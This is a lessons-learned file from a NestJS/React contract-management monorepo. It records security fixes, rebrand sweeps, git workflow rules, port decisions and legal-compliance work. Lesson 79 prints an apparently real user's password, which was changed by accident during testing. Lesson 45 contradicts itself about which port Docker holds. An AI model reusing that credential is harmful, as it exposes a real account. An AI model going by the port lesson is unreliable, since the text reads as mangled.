**Problem:**
- The only filter hiding internal notes from customers was a `.filter()` call in the React component
- Any API client (curl, Postman, mobile app) bypassed it entirely

**Root Cause:**
- Single-layer security where the only enforcement was client-side
- Backend returned all replies including `is_internal_note = true` for all users

**Fix:**
- Added DB-level `WHERE is_internal_note = false` filter in `SupportService.getTicketById` for non-staff users
- Added ownership check (`ForbiddenException`) so users can only view their own tickets
- Frontend filter now serves as a UX layer only, not security enforcement

**File:** `backend/src/modules/support/support.service.ts`

**How to Avoid:**
- Every access-control decision must be enforced at the service/DB layer
- Frontend visibility filters are UX only — treat them as if they don't exist when reasoning about security

---

## 42. @MaxLength — Apply to BOTH Create AND Update DTOs

**Problem:**
- Added `@MaxLength` to all create DTOs but initially missed standalone update DTOs
- A PATCH request to `/projects/:id` with a 100,000-character `objective` bypassed all limits

**Root Cause:**
- `PartialType(CreateXxxDto)` inherits all decorators — but standalone update DTOs inherit nothing
- 4 update DTOs (`update-project.dto.ts`, `update-obligation.dto.ts`, `update-plan.dto.ts`, `update-knowledge-asset.dto.ts`) were standalone classes, not PartialType wrappers

**Fix:**
- Added same `@MaxLength` tiers to all 4 standalone update DTOs
- Tiers: 500 (identifiers), 10,000 (comments), 20,000 (descriptions), 500,000 (clause content)

**File:** All `update-*.dto.ts` files in backend/src/modules/*

**How to Avoid:**
- When adding validation to a create DTO, immediately check whether the update DTO uses `PartialType` or is standalone
- If standalone — apply the same constraints manually

---

## 43. sanitize-html — Correct Import Syntax When esModuleInterop Is Off

**Problem:**
- Used `import sanitizeHtml from 'sanitize-html'` (default import)
- TypeScript compiled it with `allowSyntheticDefaultImports: true` — no TS error
- At runtime: `sanitize_html_1.default is not a function` — the default export was `undefined`

**Root Cause:**
- `@types/sanitize-html` uses `export = sanitize` (CommonJS `module.exports = ...`)
- `allowSyntheticDefaultImports` silences the TypeScript error but provides NO runtime shim
- `esModuleInterop` is required for a runtime shim — the project's tsconfig doesn't have it
- Without the shim, `import X from 'pkg'` for a `module.exports =` package gives `undefined` at runtime

**Fix:**
- `import * as sanitizeHtml from 'sanitize-html'` — correct for `export =` modules without `esModuleInterop`
- Null guard in the helper: `if (value == null || typeof value !== 'string') return value`
- Reason for null guard: `@Transform` fires on `undefined` for optional fields — must not pass to sanitizer

**File:** `backend/src/common/utils/sanitize.ts`

**How to Avoid:**
- For any npm package typed with `export =`: use `import * as X from 'pkg'`
- Check `@types/pkg/index.d.ts` — if the last line is `export = something`, you need namespace import
- `allowSyntheticDefaultImports: true` in tsconfig is a trap — it hides the error at compile time but not at runtime

---

## 44. Rebrand — Parent Brand Switched from CENVOX to MANAGEX

**Problem:**
The product needed a full parent-brand rebrand from CENVOX (orange combustion theme, hexagonal C+V mark, Syne/Instrument Sans typography) to MANAGEX (electric-cyan, M+X mark with 3 pillars and luminous dot, Bricolage Grotesque/DM Sans typography). The landing page, the SIGN app attribution, the workspace package names, and Docker config all had to change in one session without breaking the SIGN app.

**Root Cause:**
- Brand naming had leaked into 18 source files (including workspace package names `@cenvox/landing`, `@cenvox/sign`, `@cenvox/tokens`) and into Docker service names, the launch.json config, and the SIGN app's CSS class names (`.cenvox-backlink`, `.cenvox-attribution`, `.sign-cenvox-attribution`).
- Token file `cenvox.css` exposed `--cx-*` variables that the landing page used heavily but the SIGN app didn't reference (confirmed by greps returning zero hits inside `apps/sign`). This meant the dark/orange landing tokens could be retired safely but the SIGN-app extension palette (`--cx-brand-primary*`, `--cx-navy-*`) had to be preserved (renamed to `--mx-sign-primary*` / `--mx-navy-*`).

**Fix:**
- Renamed `apps/cenvox` → `apps/managex` and `packages/tokens/cenvox.css` → `packages/tokens/managex.css` via `git mv` (preserves history).
- Replaced the token file contents with a new `--mx-*` system (split dark/light zones + cyan brand) and a SIGN-namespaced extension palette so SIGN app keeps compiling.
- Rebuilt the landing page from scratch: new `ManagexLogo` + `HeroDashboard` components, a single `App.tsx` covering Nav → Hero → Logos → Lifecycle → Products → Why → Testimonials → Mission → CTA → Footer, and a fresh `index.css` with `mx-*` class names.
- Updated SIGN: `apps/sign/src/styles/index.css` imports `@managex/tokens/managex.css`; replaced `.cenvox-backlink` → `.managex-backlink`, recolored from orange to cyan; rewrote the auth-page orange SVG glyph as the small MANAGEX mark.
- Updated docker-compose service `cenvox` → `managex`, container `sign-cenvox` → `sign-managex`, Dockerfile paths, `.claude/launch.json`, root `package.json` scripts.

**File(s):** `apps/managex/**`, `packages/tokens/**`, `apps/sign/src/styles/index.css`, `apps/sign/src/components/layout/{TopBar.tsx,AdminLayout.tsx}`, `apps/sign/src/components/common/AuthLayout.tsx`, `apps/sign/package.json`, `apps/word-addin/src/taskpane/{App.tsx,styles/global.css}`, `docker-compose.yml`, `docker-compose.frontend.yml`, `apps/managex/Dockerfile`, `.claude/launch.json`, `package.json`, `README.md`, `CLAUDE.md`.

**How to Avoid:**
- For any future brand swap, run `grep -ri "BRANDNAME"` and `grep -r "\-\-cx-"` (or whichever token prefix is in scope) BEFORE starting work so you understand the blast radius. The grep returning zero hits in the SIGN app meant the landing-only `--cx-*` palette could be removed without touching SIGN.
- Use `git mv` instead of cp + rm so renames are tracked as renames and reviewers can diff cleanly.
- Always rename the workspace package name AND every `dependencies` reference in the same commit, or `npm ci` will fail at build time.
- After renaming a Docker service, also rename its container_name and the anonymous-volume path under it (`/app/apps/managex/node_modules`) — otherwise the next `docker-compose up` will spin up two parallel containers.
- Keep the orange/CENVOX SVG glyph code archived (in this lesson) in case the rebrand has to be partially rolled back.

---

## 45. Preview — Vite Cannot Bind 5175 While Docker Is Running

**Problem:**
After the rebrand, running the MANAGEX landing page in the Claude preview pane reported `Port 5175 is required by this server but is in use by another process`. `lsof -ti :5175` returned a single PID belonging to `com.docker.backend services` — Docker itself was holding the port.

**Root Cause:**
The repo's `docker-compose.yml` exposes the `managex` (formerly `cenvox`) service on host port 5175. Once `docker-compose up` has been executed, Docker's backend daemon continues to hold port 5175 even after the container is stopped, until Docker Desktop itself is restarted. The preview tool's autoPort mechanism injects a `PORT` env var, but Vite reads `--port` and ignores `PORT`, so autoPort had no effect on the dev server's actual bind address.

**Fix:**
- Updated `.claude/launch.json` to use port 5175 with explicit `--port 5175 --strictPort` flags passed to Vite via `runtimeArgs: ["run", "dev", "--", "--port", "5175", "--strictPort"]`. Kept `autoPort: false` so the preview pane targets the known port deterministically.
- Documented in CLAUDE.md "Preview port quirk" — 5175 is reserved for Docker, 5175 is the local dev port.

**File:** `.claude/launch.json`

**How to Avoid:**
- When picking a preview port for a service that also has a docker-compose mapping, do not reuse the docker host port. Pick a sibling port (5175, 8081, etc.) and document it.
- Vite respects `--port` and ignores `PORT` — if you want a port to actually take effect, pass it via CLI args, not env vars.
- For preview-tool autoPort to work with Vite, the start command must read the PORT env (e.g., `vite --port $PORT`); otherwise leave autoPort off and hardcode the port.

---

## 46. Ports — 5175 Is the Canonical MANAGEX Landing Port

**Decision:**
Port 5175 is now the canonical local-development port for the MANAGEX landing page across the entire monorepo. The previous port (one less than 5175) is retired and must not be reintroduced anywhere — code, configs, docs, Dockerfiles, docker-compose, env files, or markdown.

**Root cause for the migration:**
Docker Desktop's `com.docker.backend` daemon keeps the prior host port bound after `docker-compose up` is run, so Vite (and the Claude preview tool) cannot bind it again without restarting Docker. Rather than fight this, the old port was abandoned. Every reference was rewritten to 5175 in one global pass.

**Files touched in the global migration (2026-05-13):**
- `apps/managex/vite.config.ts` (server.port)
- `apps/managex/Dockerfile` (EXPOSE + CMD --port)
- `docker-compose.yml` (managex service host:container mapping)
- `docker-compose.frontend.yml` (managex service host:container mapping)
- `backend/src/main.ts` (CORS allowlist entry)
- `apps/sign/src/components/layout/AdminLayout.tsx` (MANAGEX backlink href)
- `apps/sign/src/components/common/AuthLayout.tsx` (sub-brand tag + footer attribution hrefs)
- `CLAUDE.md`, `lessons.md`, `README-DEV.md`, `docs/BUILD_STATUS_REPORT.md` (all docs)

**Production rule:**
When deploying to production, every `http://localhost:5175` reference becomes `https://managex.ai/`. There is no other place the MANAGEX landing will be served from.

**How to Avoid Regressions:**
- Before merging any PR, run `grep -r "517" . --exclude-dir=node_modules --exclude-dir=.git` and confirm the only port digit-strings present are 5173 (SIGN dev), 5175 (MANAGEX), and 5180 (SIGN dev override). The previous MANAGEX port must not reappear.
- New landing-page features that need a port must use 5175. Tooling defaults (Vite's 5173, etc.) are off-limits — both are claimed by SIGN's dev server.
- If a teammate proposes restoring the prior MANAGEX port because "Docker holds 5175 now," investigate Docker state instead — never split the port between environments.

---

## 47. Coordination — "Done" = On Main With Green CI, Never "Pushed to a Branch"

**Problem:**
Two feature branches (MANAGEX rebrand and legal layer) were considered "done" by the developer because the code was pushed to a remote branch. Both went undiscovered for days. When found:
- Both had to be rebased because main had moved forward
- The MANAGEX branch required 4 CI fix cycles
- The legal layer branch required a clean rebase over Phase 3.2 AND the MANAGEX commit
- Hours of coordination time could have been saved with immediate PRs

**Root Cause:**
No shared definition of "done." "I pushed the branch" was treated as completion, not as work-in-progress.

**Fix:**
Work is NOT done until: (1) branch pushed, (2) PR opened against main, (3) CI green on all 3 jobs, (4) PR merged to main. Any earlier state = work in progress.

**File:** Team agreement — applies to every developer.

**How to Avoid:**
- Never say "it's done" or "I shipped it" without a merged PR link
- Use GitHub PR status as the canonical source of truth, not branch existence

---

## 48. Rebrand — Always Run a Negative-Filter Sweep After a Big Rename

**Problem:**
The MANAGEX rebrand (71 files) used a positive-filter grep (`--include="*.ts,*.tsx,*.json"`). This missed:
- `.github/workflows/ci.yml` — found during CI failure
- `apps/sign/Dockerfile` — found in post-CI sweep
- `apps/word-addin/manifest.xml` ProviderName — found in third sweep
- `apps/word-addin/manifest.localhost.xml` — found in third sweep
- `apps/word-addin/README.md` — found in third sweep
- `README-DEV.md` dev commands — found in third sweep
- `package-lock.json` stale workspace entry — found in third sweep

**Root Cause:**
`--include` silently excludes files with no extension (Dockerfile), unusual extensions (.xml), and generated files (.lock).

**Fix:**
Use a NEGATIVE filter as the final verification for any rename:
```bash
grep -rni "OLD_NAME" . \
  --exclude-dir=node_modules --exclude-dir=.git \
  --exclude-dir=dist --exclude-dir=build \
  --exclude-dir=coverage \
  --exclude="*.lock" --exclude="*.log"
```
Then classify each hit: "functional" (change it) vs "historical" (leave it).

**File:** Any rename operation.

**How to Avoid:**
Never use `--include` for a rebrand sweep — always use a blanket grep with targeted exclusions.

---

## 49. Coordination — Rebasing Requires Pulling BEFORE Opening a PR

**Problem:**
Two PRs were opened from branches that were cut weeks before the current state of main:
- `feat/legal-layer` was cut from `be13d6b` (Phase 2) — would have silently dropped Phase 3.2 security work if merged without rebasing
- `claude/quirky-khorana-1d5fcc` was cut from `602cf77` (before Phase 3.2) — same risk

**Root Cause:**
Developers opened PRs without checking whether their branch was behind `origin/main`.

**Fix:**
Before opening any PR, always run:
```
git fetch origin
git log HEAD..origin/main --oneline
```
If this returns ANYTHING, rebase first:
```
git rebase origin/main
```
Resolve conflicts on YOUR branch, then force-push, then open the PR. CI confirms everything coexists.

**File:** Pre-PR workflow — applies to every developer.

**How to Avoid:**
Make `git log HEAD..origin/main --oneline` a muscle-memory habit before every `gh pr create`.

---

## 50. gitignored Files Are Invisible to Rebrand Sweeps

**Problem:**
`docker-compose.override.yml` is gitignored (local-only). The MANAGEX rebrand correctly renamed all committed files, but the override still had `cenvox:` service references. After pulling the rebrand, `docker-compose up` failed with `service "cenvox" has neither an image nor a build context` on Ayman's machine.

**Root Cause:**
gitignored files are invisible to code review, CI, and all grep sweeps against the git tree. They have to be checked manually.

**Fix:**
After any rename touching docker-compose.yml service names:
1. Check if `docker-compose.override.yml` exists locally
2. Manually update any stale service name references in it
3. Consider adding a `docker-compose.override.yml.example` to the repo so new developers know the file must exist

**File:** `docker-compose.override.yml` (gitignored — update manually after any service rename)

**How to Avoid:**
Add "check gitignored override files" as the final step of any rename that touches docker-compose service names.

---

## 51. gh CLI — workflow Scope Required to Push CI Workflow Files

**Problem:**
Default `gh auth login` scopes (`gist`, `read:org`, `repo`) do NOT include `workflow`. Any push touching `.github/workflows/` is rejected:
> "refusing to allow an OAuth App to create or update workflow without workflow scope"

This blocked the MANAGEX rebrand force-push for over an hour across 3–4 attempts.

**Root Cause:**
GitHub silently rejects `workflow`-less pushes at the remote — git reports the push as successful but the ref is not updated. The error only appears in verbose output or when checking the remote afterward.

**Fix:**
On first-time setup, or after any re-authentication:
```
gh auth login --scopes "repo,workflow,read:org,gist" --web
```
If already logged in without the scope:
```
gh auth logout --hostname github.com
gh auth login --scopes "repo,workflow,read:org,gist" --web
```
Verify after login:
```
gh auth status | grep "Token scopes"
```
Must show `workflow`.

**File:** One-time machine setup — persists until next logout.

**How to Avoid:**
Run `gh auth status | grep "Token scopes"` before any push that touches `.github/workflows/`. If `workflow` is missing, re-auth before pushing.

---

## 52. Coordination — Open a DRAFT PR Within 24–48 Hours of Branch Creation

**Problem:**
Long-lived branches compound rebase cost non-linearly:
- `feat/legal-layer` lived 4+ days before merge → required rebasing over Phase 3.2 + MANAGEX
- `claude/quirky-khorana-1d5fcc` lived 3+ days → required rebasing over Phase 3.2

A branch 10 days old can take 10× longer to rebase than a branch 1 day old.

**Root Cause:**
No convention around when to open PRs. Developers treated "open PR" as the last step, not the first.

**Fix:**
Open a DRAFT PR the same day you create a branch. This:
1. Makes the work visible to teammates immediately
2. Allows early feedback before it hardens
3. Creates pressure to finish and merge quickly
4. Means CI runs early — issues found before they compound

When ready: convert to "Ready for review," request merge.

**File:** Team convention — applies to every developer.

**How to Avoid:**
`gh pr create --draft` on day 1. Never let a branch exist for more than 48 hours without a PR.

---

## 53. Post-Merge — Always Verify Phase 3.2 Artifacts Survived

**Problem:**
Every merge during the May 2026 coordination period carried a real risk that Phase 3.2 security work would be silently dropped if conflict resolution was done incorrectly. The MANAGEX rebase specifically dropped `sanitize.ts`, all `@MaxLength`, and `@Transform` decorators — caught only because of a deliberate 5-check post-merge verification.

**Root Cause:**
Conflict resolution on CLAUDE.md / lessons.md / App.tsx favored "their side" without checking whether "our side" contained critical backend security changes.

**Fix:**
Run the 5-check verification after EVERY merge that touches backend code, CLAUDE.md, or lessons.md:
```
ls backend/src/common/utils/sanitize.ts
grep "sanitize-html" backend/package.json
grep "@MaxLength" backend/src/modules/clauses/dto/create-clause.dto.ts
grep "@Transform" backend/src/modules/clauses/dto/create-clause.dto.ts
grep "is_internal_note" backend/src/modules/support/support.service.ts
```
All 5 must return matches. If ANY fails, the merge dropped Phase 3.2 security work — do not proceed.

**File:** Post-merge checklist — permanent fixture for any backend-touching merge.

**How to Avoid:**
Treat these 5 checks as non-negotiable. Add them to the Pre-PR checklist in CLAUDE.md (done — May 2026).

---

## 76. DB Family Revocation Does Not Invalidate Live Access Tokens

**Problem:**
Phase 4.2 shipped with `revokeFamily()` that correctly marked all session
rows as revoked in the database. However, `JwtStrategy` only checks the
Redis blacklist — it does NOT query the database on every request (that
would be too slow). Result: when a token reuse attack was detected and the
family was "revoked," the attacker's already-issued access tokens kept
passing `JwtStrategy` validation for up to 15 minutes (the full access
token TTL) because their JTIs were never added to Redis.

**Root cause:**
Two separate revocation systems exist:
- **DB revocation**: prevents new refresh operations (checked by `refreshToken()`)
- **Redis blacklist**: invalidates live access tokens (checked by `JwtStrategy` on every request)

`revokeFamily()` only handled the DB side. The Redis side was missing.

**Fix:**
Before calling `revokeFamily()`, the reuse-detection path now:
1. Calls `listByFamily(familyId)` to fetch all session rows in the family
2. Blacklists each session's `jti` in Redis with TTL = remaining access
   token lifetime (computed via `parseExpiryToSeconds(JWT_ACCESS_EXPIRES_IN)`)
3. Only then calls `revokeFamily()` to mark DB rows as revoked

Both systems must be updated atomically on family revocation.

**Files fixed:**
- `session.service.ts`: added `listByFamily()`
- `auth.service.ts`: added `parseExpiryToSeconds()` + fixed reuse-detection block

**Commits:** `501d48f` (bug fix) + `ef13a1e` (CI fix — see lesson #77)

**Rule:**
Whenever you add a new revocation path, ask: *"Does this also invalidate
live access tokens in Redis?"* DB changes alone are never sufficient —
Redis is the runtime gate, the DB is the persistence layer. For family
revocation the order is always: blacklist JTIs → revoke DB rows.

---

## 77. Stale Service Mocks Break CI When New Methods Are Added

**Problem:**
Adding `listByFamily()` to `SessionService` caused CI to fail on the
next run. `token-security.spec.ts` had a hand-written `mockSessionService`
object created when Phase 4.2 was first implemented — before
`listByFamily()` existed. When `auth.service.ts` called `listByFamily()`
in the reuse-detection path, Jest threw:

```
TypeError: this.sessions.listByFamily is not a function
```

This caused a CI failure that required a separate hotfix commit (`ef13a1e`)
— an entire extra CI cycle that could have been avoided.

**Root cause:**
Hand-written mocks in NestJS specs list methods explicitly. They don't
automatically pick up new methods added to the real service. The gap
between the real service and its mock is invisible at author time — it
only surfaces when the new code path is exercised in tests.

**Fix:**
Added `listByFamily: jest.fn(async (familyId: string) => sessions.filter(s => s.family_id === familyId))` to `mockSessionService` in `token-security.spec.ts`.

**Rule:**
When you add a method to ANY service that has mocks in spec files,
immediately grep for every mock of that service:

```bash
grep -rn "mockSessionService\|SessionService.*useValue\|provide.*SessionService" \
  backend/src --include="*.spec.ts"
```

Add the new method to every mock found. Do this **in the same commit** as
the service change — never in a follow-up. A `jest.fn().mockResolvedValue([])`
stub is enough if the specific test doesn't need real behavior.

**Alternative:** Use `jest.createMockFromModule()` or `@golevelup/ts-jest`'s
`createMock<ServiceType>()` which auto-mocks all methods. Eliminates the
staleness problem entirely.

---

## 78. Multiple DTOs With the Same Name — Always Trace the Actual Endpoint

**Problem:**
Three separate `ChangePasswordDto` classes exist in different modules (`auth`, `admin-security`, `users`). We edited `auth/dto/change-password.dto.ts` but the frontend calls the `admin-security` DTO via `POST /me/change-password`. The fix had no effect — weak passwords still accepted.

**Root Cause:**
Assumed the filename `change-password.dto.ts` in the auth module was the one the frontend used. Never traced the actual frontend service call (`meService.changePassword()`) → API route → controller → DTO import path. The three DTOs are:
- `auth/dto/change-password.dto.ts` → `PATCH /auth/change-password`
- `admin-security/dto/admin-security.dto.ts::ChangePasswordDto` → `POST /me/change-password` ← **frontend uses this one**
- `users/dto/change-password.dto.ts` → `PUT /users/me/password`

**Fix:**
Traced `meService.ts` → `POST /me/change-password` → `profile.controller.ts` → `admin-security.dto.ts::ChangePasswordDto`. Fixed all three DTOs + the `security_policies` DB row.

**How to Avoid:**
- Always trace from frontend service call → API route → controller → DTO import before editing any DTO
- Never assume by filename alone — grep the import chain
- When a fix "doesn't work", first check if you edited a dead code path by tracing the actual call stack
- If the same logical concept (change-password) has multiple DTO files, grep the entire codebase for all of them before editing any one

---

## 79. Never Test Destructive Endpoints With Real User Credentials on a Live Database

**Problem:**
During curl validation testing of the `POST /me/change-password` endpoint, TEST 4 (the "valid password accepted" test) used the actual authenticated user's token against the real running database. It silently changed the user's password. The user then could not log in because their password was now `M/ohamed12345` (the test value), not what they expected.

**Root Cause:**
The test was designed to confirm that a valid password IS accepted (to prove the happy path works). That confirmation required a real write to the database. No safeguard existed between "this call returns 200" and "this call changes production data."

**Fix:**
Had to identify the new password from the curl response, then verify it via login. The `security_policies` Redis cache also needed flushing when login rate limiting kicked in from the test attempts.

**How to Avoid:**
- Before running any curl/API test against a destructive endpoint (change-password, delete, update-email, deactivate-account), document EXACTLY what side effect it will have on the live DB
- Use a dedicated throwaway test user (`test-api@sign.com`) for any manual API testing — never the real admin account
- For "confirm it accepts valid input" tests: instead of actually changing the password, verify by checking the response structure or by using a test account whose password you don't care about
- If you must test live: reset the changed value immediately as the next step in the same test script — never leave a test-mutated state in the DB

---

## 80. Password Validation Audit Must Cover ALL DTOs With a Password Field

**Problem:**
When hardening password validation to min-12 + complexity regex, we audited only the three `ChangePasswordDto` files. We missed `accept-invitation.dto.ts` which also accepts a password field. The backend allowed 8-char passwords on invitation acceptance while every other flow enforced 12.

**Root Cause:**
Searched for "ChangePasswordDto" and "change-password" but never searched for ALL DTOs containing a password field. The invitation flow sets a password for a brand-new user — it is effectively a registration, not a password change. The audit scope was too narrow.

**Fix:**
Updated `accept-invitation.dto.ts` to match `RegisterDto` exactly: `@MinLength(12)` + same `.{12,}` complexity regex + updated error message to include "at least 12 characters".

**How to Avoid:**
- When changing password rules, grep for ALL password fields across every DTO:
  `grep -rn "password" backend/src --include="*.dto.ts"`
- Any DTO with a `password` / `new_password` field must enforce the same rules as `RegisterDto`
- The complete list as of 2026-05-20 — all must stay in sync:
  - `auth/dto/register.dto.ts`
  - `auth/dto/reset-password.dto.ts`
  - `auth/dto/accept-invitation.dto.ts`
  - `auth/dto/change-password.dto.ts`
  - `admin-security/dto/admin-security.dto.ts` (`ChangePasswordDto`)
  - `users/dto/change-password.dto.ts`
- Frontend pages must also be checked: `RegisterPage`, `ResetPasswordPage`, `AcceptInvitationPage`, `MySecurityPage`

---

## 📝 Template for New Lessons

```
## N. Category — Short Description

**Problem:**
- What symptom did you see?
- What was the error message?

**Root Cause:**
- Why did it happen?
- What was the underlying issue?

**Fix:**
- What exact change fixed it?
- Code snippet if applicable

**File:** which file(s) were changed

**How to Avoid:**
- How to detect this early next time
- What to check first when this symptom appears
```

---

*Last updated: 2026-05-16*
*Feed this file to Claude at the start of every new session*

---

## Legal & Policy Layer Implementation — May 2025

**Context:** Full implementation of the SIGN Platform legal and compliance layer across 5 commits on `feat/legal-layer`. Covered: 10 policy documents, 11 new public routes, cookie consent, T&C acceptance, DB migration, AI disclaimers, communications preferences, and Word Add-In disclosures.

### Lesson 1 — Always Fast-Forward Before Committing to a Shared Branch

**What happened:** When the legal-docs commit was pushed to `main`, local `main` was 3 commits behind `origin/main`. The push would have been rejected if changes had been committed first.

**Fix:** Always run `git pull origin <branch>` or `git fetch && git merge` before committing when working on a shared branch with a colleague.

**Rule:** Before any commit+push sequence on a shared branch, run:

```bash
git fetch origin
git status
git pull origin HEAD
```

### Lesson 2 — Feature Branches Are Non-Negotiable for Large Changes

**What happened:** The initial prompt scripted direct commits to `main` for a 25-file, 2-endpoint, 1-migration change. Claude Code correctly flagged this as risky before executing.

**Fix:** Used `feat/legal-layer` feature branch instead. All 5 commits landed there. PR opened for colleague review before merge to main.

**Rule:** Any change touching more than 5 files, any DB migration, or any NestJS endpoint addition must go on a feature branch and through a PR. Never commit directly to `main` for changes of this scope.

### Lesson 3 — class-validator Does Not Ship @IsTrue — Use @Equals(true)

**What happened:** The `RegisterDto` implementation required a validator that ensures `agreed_to_terms` must be boolean `true` (not just truthy). The prompt specified `@IsTrue()` but `class-validator` does not export that decorator.

**Fix:** Used `@Equals(true)` instead, which produces identical server-side behavior and is the canonical class-validator equivalent.

**Rule:** When validating that a boolean field must be `true` (e.g. consent checkboxes), use:

```typescript
@IsBoolean()
@Equals(true, { message: 'You must accept the Terms and Conditions' })
agreed_to_terms: boolean;
```

Do not use `@IsTrue()` — it does not exist in `class-validator`.

### Lesson 4 — TypeORM Migration Timestamps Must Be Unique and Current

**What happened:** The `AddConsentColumns` migration needed a timestamp prefix in its filename (e.g. `1746950000001-AddConsentColumns.ts`). Using a stale or duplicate timestamp causes TypeORM to misorder migrations or skip them.

**Fix:** Always use the actual current Unix millisecond timestamp when naming a new migration file. Do not copy a timestamp from an existing migration.

**Rule:** Generate migration filenames with:

```bash
date +%s%3N
```

Use that output as the prefix: `{timestamp}-MigrationName.ts`.

### Lesson 5 — Public Routes Must Be Declared Before ProtectedRoute in App.tsx

**What happened:** All 11 `/legal/*` routes needed to be accessible without authentication. If placed inside the `ProtectedRoute` wrapper, unauthenticated users (including Google crawlers, guest signers, and users reading the T&C before registering) would be redirected to `/auth/login`.

**Fix:** All `/legal/*` routes were added BEFORE the `ProtectedRoute` wrapper in `App.tsx`.

**Rule:** In React Router DOM v6 with a `ProtectedRoute` pattern, any route that must be publicly accessible (legal pages, landing, auth pages) must be declared outside and before the `ProtectedRoute` element in the Routes tree. Structure:

```tsx
<Routes>
  <Route path="/" element={<LandingPage />} />          {/* public */}
  <Route path="/legal" element={<LegalHubPage />} />    {/* public */}
  <Route path="/legal/*" element={<.../>} />            {/* public */}
  <Route path="/auth/*" element={<.../>} />             {/* public */}
  <Route element={<ProtectedRoute />}>                  {/* auth required */}
    <Route path="/app/*" element={<.../>} />
  </Route>
</Routes>
```

### Lesson 6 — Cookie Consent State Belongs in localStorage, Not Redux

**What happened:** Cookie consent state needs to persist across sessions and be accessible before the React app fully hydrates (to prevent flash of unconsented analytics loading). Redux state is lost on page refresh.

**Fix:** Cookie consent is stored in `localStorage` under the key `'sign_cookie_consent'` as a JSON object with `status`, `timestamp`, `version`, and `categories`. A `CookieConsentContext` wraps the app to share the `openPreferences()` function without prop drilling.

**Rule:** Any state that must survive page refresh AND must be readable before React hydration (consent flags, language preference, theme) belongs in `localStorage`, not Redux. Use a context to expose the setter.

### Lesson 7 — Office Add-In Links Cannot Use Regular Anchor Tags

**What happened:** The Word Add-In (`apps/word-addin/`) runs inside Microsoft Office's sandboxed webview. Regular `<a href="...">` tags either do nothing or throw security errors when pointing to external URLs.

**Fix:** All external links in the Add-In use:

```typescript
Office.context.ui.openBrowserWindow('https://www.sign.io/legal/terms')
```

Wrapped in a `<span onClick={...}>` element styled to look like a link.

**Rule:** Never use `<a href>` for external navigation inside any Office Add-In component. Always use `Office.context.ui.openBrowserWindow(url)`. This applies to all tabs: LoginTab, RiskTab, SummaryTab, LibraryTab, UploadTab, ChatTab.

### Lesson 8 — Sidebar Navigation Is Emoji-Driven, Not Lucide-React

**What happened:** The implementation prompt specified adding a Communications entry to the Sidebar with a lucide-react `Bell` icon, matching the pattern used in other platform components. But the `clientNavItems` array in `App.tsx` uses emoji strings as icons, not React components.

**Fix:** Added the Communications sidebar entry using the 📣 emoji to match the existing convention rather than rewriting the sidebar schema.

**Rule:** Before adding any navigation item to `Sidebar.tsx`, check the schema of the existing nav items array. The SIGN sidebar uses emoji strings `{ label, path, icon: string }` — not lucide-react components. If the sidebar is ever refactored to use lucide-react, update all entries at once.

### Lesson 9 — DB Columns for Compliance Flags Need API Surface Immediately

**What happened:** The `email_digest_opt_out` column was added in a previous migration (Phase 3.4 compliance) but had no API endpoint to read or update it. It could only be changed via direct SQL. This meant the feature existed in the DB but was completely inaccessible to users for months.

**Fix:** In this session, `PATCH /me/communication-preferences` was added to expose `email_digest_opt_out` alongside the new `marketing_email_opt_in` and `ai_training_opt_in` columns. All three are now settable via the `CommunicationPreferencesPage`.

**Rule:** Every time a new boolean preference or flag column is added to the `users` table, the corresponding API endpoint (GET + PATCH) and UI toggle must be shipped in the same PR. Never ship a DB column without its API surface.

### Lesson 10 — Legal Pages Need a Standalone Layout With No Sidebar

**What happened:** Legal pages (`/legal/*`) are public-facing and must be accessible without authentication. They also need a different visual structure from the authenticated app (no sidebar, no app topbar, different header with breadcrumb back to `/legal`).

**Fix:** Created `LegalPageLayout.tsx` as a standalone layout component used exclusively by all `/legal/*` pages. It has its own header, sticky ToC sidebar, content area, and footer — completely independent of `AppLayout` and `AdminLayout`.

**Rule:** When adding public-facing pages to a platform that has an authenticated layout, always create a separate standalone layout component. Do not try to conditionally hide the sidebar/topbar in the existing `AppLayout` — that approach creates visual flicker and couples public pages to auth state.

### Lesson 11 — AI Output Components Must Always Show Disclaimer Labels

**What happened:** The SIGN platform's AI features (contract risk analysis, compliance checking, Q&A chat) produced outputs with no indication that the content was AI-generated or that it was not legal advice. This creates both regulatory risk and user misunderstanding.

**Fix:** Created a reusable `AIDisclaimer` component added to the top-level rendering parent of each AI output: ContractDetailPage (Risk tab), ComplianceTab, and ChatPanel.

**Rule:** Every component that renders AI-generated output must include `<AIDisclaimer />` immediately below the output. The `compact={true}` prop is for inline use within tight layouts. The full version is for dedicated output panels. Never remove or make the disclaimer conditional on user preference — it is a transparency obligation, not a feature.

### Lesson 12 — T&C Acceptance Requires Both Frontend and Backend Enforcement

**What happened:** The registration flow had no T&C acceptance at all. Adding it required changes in three places: the frontend checkbox + disabled button state, the `RegisterDto` validation, and the `auth.service` timestamp recording.

**Fix:** All three layers implemented in the same commit:
- **Frontend:** `agreedToTerms` state, `disabled={!agreedToTerms}` on submit button
- **DTO:** `@Equals(true)` validation on `agreed_to_terms`
- **Service:** `accepted_terms_at = new Date()` set server-side on registration

**Rule:** Consent acceptance must be enforced at all three layers. Frontend disabling is UX — a user can bypass it with DevTools. DTO validation is the real enforcement. Server-side timestamp recording is the legal evidence. All three must ship together.

### Lesson 13 — Settlement Agreement Acknowledgment Deferred — Track It

**What happened:** The legal layer required a mandatory acknowledgment checkbox before executing a settlement agreement through the Claims module. The settlement execution modal does not yet exist in the codebase.

**Status:** DEFERRED. The persistent claims disclaimer banner shipped. The settlement acknowledgment checkbox will be added when the settlement execution modal is built.

**Backlog item:** When building the Claims settlement execution modal, add a mandatory checkbox above the confirm button:

```tsx
<label className="flex items-start gap-3 cursor-pointer">
  <input
    type="checkbox"
    checked={settlementAcknowledged}
    onChange={(e) => setSettlementAcknowledged(e.target.checked)}
    className="mt-0.5 accent-amber-600"
  />
  <span className="text-sm text-amber-800">
    I understand that executing this settlement agreement has legal
    consequences. I have obtained independent legal advice or
    waive my right to do so. This action cannot be undone.
  </span>
</label>
```

Disable the confirm button while `settlementAcknowledged` is false.

### Lesson 14 — Verify Columns After Every Migration, Not Just After Running It

**What happened:** The migration ran successfully but we still ran `\d users` separately to confirm all 8 columns were actually present. This caught an important distinction — a successful migration log does not guarantee the columns are there if the migration file had errors.

**Fix:** After every migration, always run the column verification step:

```bash
docker-compose exec postgres psql -U sign_user -d sign_db -c "\d users"
```

And visually confirm each expected column appears in the output.

**Rule:** Migration success message ≠ column presence confirmed. Always verify the DB state directly after running migrations, especially for migrations that add columns depended on by new API endpoints or frontend features.

### Lesson 15 — Large Feature Branches Need Phased Commits, Not One Mega-Commit

